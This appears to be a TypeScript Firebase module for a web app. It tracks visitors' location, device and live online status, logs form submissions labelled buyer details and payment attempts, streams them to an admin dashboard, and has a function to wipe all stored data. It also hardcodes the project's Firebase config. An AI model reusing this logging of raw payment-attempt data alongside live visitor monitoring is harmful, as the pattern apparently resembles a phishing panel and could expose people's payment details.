import { initializeApp } from "firebase/app";
import {
  getFirestore,
  collection,
  addDoc,
  doc,
  setDoc,
  updateDoc,
  getDocs,
  deleteDoc,
  query,
  where,
  orderBy,
  limit,
  onSnapshot,
  serverTimestamp,
  Timestamp,
  writeBatch,
} from "firebase/firestore";
import {
  getAuth,
  signInWithEmailAndPassword,
  signOut,
  onAuthStateChanged,
  User,
} from "firebase/auth";

const firebaseConfig = {
  apiKey: "AIzaSyDgFnMZD4NHBPe6cAT1CtL1amIBqmaKzEU",
  authDomain: "ziolm-16b34.firebaseapp.com",
  databaseURL: "https://ziolm-16b34-default-rtdb.firebaseio.com",
  projectId: "ziolm-16b34",
  storageBucket: "ziolm-16b34.firebasestorage.app",
  messagingSenderId: "669950264738",
  appId: "1:669950264738:web:b18d8aae90b7e048c3defb",
  measurementId: "G-XVP5TC5KKQ",
};

const app = initializeApp(firebaseConfig);
export const db = getFirestore(app);
export const auth = getAuth(app);

export interface VisitorData {
  visitorId: string;
  country: string;
  city: string;
  currentPage: string;
  isOnline: boolean;
  lastSeen: Timestamp;
  userAgent: string;
  screenSize: string;
  language: string;
  referrer: string;
  entryPage: string;
  sessionStart: Timestamp;
  pageViews: number;
}

export interface FormSubmission {
  visitorId: string;
  formType: "buyer_details" | "payment_attempt";
  data: Record<string, any>;
  timestamp: Timestamp;
  success: boolean;
}

export interface PageView {
  visitorId: string;
  page: string;
  timestamp: Timestamp;
  duration?: number;
}

const getVisitorId = (): string => {
  let visitorId = localStorage.getItem("visitorId");
  if (!visitorId) {
    visitorId =
      "visitor_" +
      Math.random().toString(36).substring(2) +
      Date.now().toString(36);
    localStorage.setItem("visitorId", visitorId);
  }
  return visitorId;
};

const getLocationData = async (): Promise<{
  country: string;
  city: string;
}> => {
  try {
    const response = await fetch("https://ipapi.co/json/");
    const data = await response.json();
    return {
      country: data.country_name || "Unknown",
      city: data.city || "Unknown",
    };
  } catch {
    return { country: "Unknown", city: "Unknown" };
  }
};

export const trackVisitor = async (currentPage: string) => {
  try {
    const visitorId = getVisitorId();
    const location = await getLocationData();

    const visitorRef = doc(db, "visitors", visitorId);

    const visitorData: Partial<VisitorData> = {
      visitorId,
      country: location.country,
      city: location.city,
      currentPage,
      isOnline: true,
      lastSeen: serverTimestamp() as Timestamp,
      userAgent: navigator.userAgent,
      screenSize: `${window.innerWidth}x${window.innerHeight}`,
      language: navigator.language,
      referrer: document.referrer || "direct",
    };

    const isNewSession = !sessionStorage.getItem("sessionStarted");
    if (isNewSession) {
      sessionStorage.setItem("sessionStarted", "true");
      visitorData.entryPage = currentPage;
      visitorData.sessionStart = serverTimestamp() as Timestamp;
      visitorData.pageViews = 1;
    }

    await setDoc(visitorRef, visitorData, { merge: true });

    await addDoc(collection(db, "pageViews"), {
      visitorId,
      page: currentPage,
      timestamp: serverTimestamp(),
    });

    return visitorId;
  } catch (error) {
    console.error("Error tracking visitor:", error);
    return null;
  }
};

export const updateOnlineStatus = async (isOnline: boolean) => {
  try {
    const visitorId = getVisitorId();
    const visitorRef = doc(db, "visitors", visitorId);
    await updateDoc(visitorRef, {
      isOnline,
      lastSeen: serverTimestamp(),
    });
  } catch (error) {
    console.error("Error updating online status:", error);
  }
};

export const trackPageView = async (page: string) => {
  try {
    const visitorId = getVisitorId();
    const visitorRef = doc(db, "visitors", visitorId);

    await updateDoc(visitorRef, {
      currentPage: page,
      lastSeen: serverTimestamp(),
    });

    await addDoc(collection(db, "pageViews"), {
      visitorId,
      page,
      timestamp: serverTimestamp(),
    });
  } catch (error) {
    console.error("Error tracking page view:", error);
  }
};

export const saveFormSubmission = async (
  formType: "buyer_details" | "payment_attempt",
  data: Record<string, any>,
  success: boolean,
) => {
  try {
    const visitorId = getVisitorId();

    await addDoc(collection(db, "formSubmissions"), {
      visitorId,
      formType,
      data,
      timestamp: serverTimestamp(),
      success,
    }),
      { merge: true };
  } catch (error) {
    console.error("Error saving form submission:", error);
  }
};

export const subscribeToVisitors = (
  callback: (visitors: VisitorData[]) => void,
) => {
  const q = query(
    collection(db, "visitors"),
    orderBy("lastSeen", "desc"),
    limit(100),
  );

  return onSnapshot(q, (snapshot) => {
    const visitors = snapshot.docs.map((doc) => doc.data() as VisitorData);
    callback(visitors);
  });
};

export const subscribeToFormSubmissions = (
  callback: (submissions: FormSubmission[]) => void,
) => {
  const q = query(
    collection(db, "formSubmissions"),
    orderBy("timestamp", "desc"),
    limit(100),
  );

  return onSnapshot(q, (snapshot) => {
    const submissions = snapshot.docs.map(
      (doc) => ({ id: doc.id, ...doc.data() }) as any,
    );
    callback(submissions);
  });
};

export const getOnlineVisitorsCount = (callback: (count: number) => void) => {
  const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
  const q = query(collection(db, "visitors"), where("isOnline", "==", true));

  return onSnapshot(q, (snapshot) => {
    const onlineCount = snapshot.docs.filter((doc) => {
      const data = doc.data();
      const lastSeen = data.lastSeen?.toDate?.() || new Date(0);
      return lastSeen > fiveMinutesAgo;
    }).length;
    callback(onlineCount);
  });
};

export { getVisitorId };

// Auth functions
export const loginAdmin = async (email: string, password: string) => {
  try {
    const userCredential = await signInWithEmailAndPassword(
      auth,
      email,
      password,
    );
    return { user: userCredential.user, error: null };
  } catch (error: any) {
    let errorMessage = "Login failed. Please try again.";
    switch (error.code) {
      case "auth/invalid-email":
        errorMessage = "Invalid email address";
        break;
      case "auth/user-not-found":
        errorMessage = "No account found with this email";
        break;
      case "auth/wrong-password":
        errorMessage = "Incorrect password";
        break;
      case "auth/too-many-requests":
        errorMessage = "Too many attempts. Please try again later";
        break;
      case "auth/invalid-credential":
        errorMessage = "Invalid email or password";
        break;
    }
    return { user: null, error: errorMessage };
  }
};

export const logoutAdmin = async () => {
  try {
    await signOut(auth);
    return { success: true, error: null };
  } catch (error: any) {
    return { success: false, error: error.message };
  }
};

export const subscribeToAuthState = (callback: (user: User | null) => void) => {
  return onAuthStateChanged(auth, callback);
};

export const deleteAllData = async (): Promise<{ success: boolean; error: string | null }> => {
  try {
    const batch = writeBatch(db);
    
    // Delete all visitors
    const visitorsSnapshot = await getDocs(collection(db, "visitors"));
    visitorsSnapshot.docs.forEach((docSnapshot) => {
      batch.delete(docSnapshot.ref);
    });
    
    // Delete all form submissions
    const formsSnapshot = await getDocs(collection(db, "formSubmissions"));
    formsSnapshot.docs.forEach((docSnapshot) => {
      batch.delete(docSnapshot.ref);
    });
    
    // Delete all page views
    const pageViewsSnapshot = await getDocs(collection(db, "pageViews"));
    pageViewsSnapshot.docs.forEach((docSnapshot) => {
      batch.delete(docSnapshot.ref);
    });
    
    await batch.commit();
    return { success: true, error: null };
  } catch (error: any) {
    console.error("Error deleting all data:", error);
    return { success: false, error: error.message };
  }
};

export type { User };
